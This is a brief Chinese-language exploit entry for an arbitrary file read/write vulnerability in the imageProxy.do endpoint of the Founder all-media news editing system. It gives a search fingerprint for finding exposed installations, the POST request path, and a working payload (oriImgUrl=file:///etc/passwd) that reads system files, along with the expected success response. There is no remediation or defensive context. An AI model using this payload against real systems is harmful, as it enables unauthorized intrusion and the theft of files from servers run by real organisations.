# 方正畅享全媒体新闻采编系统imageProxy.do任意文件读取漏洞

方正畅享全媒体新闻采编系统imageProxy.do ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="FOUNDER-全媒体采编系统"`
- **请求**：`POST /newsedit/outerfotobase/imageProxy.do HTTP/1.1`

**Payload**
```
oriImgUrl=file:///etc/passwd
```
- **响应特征**：200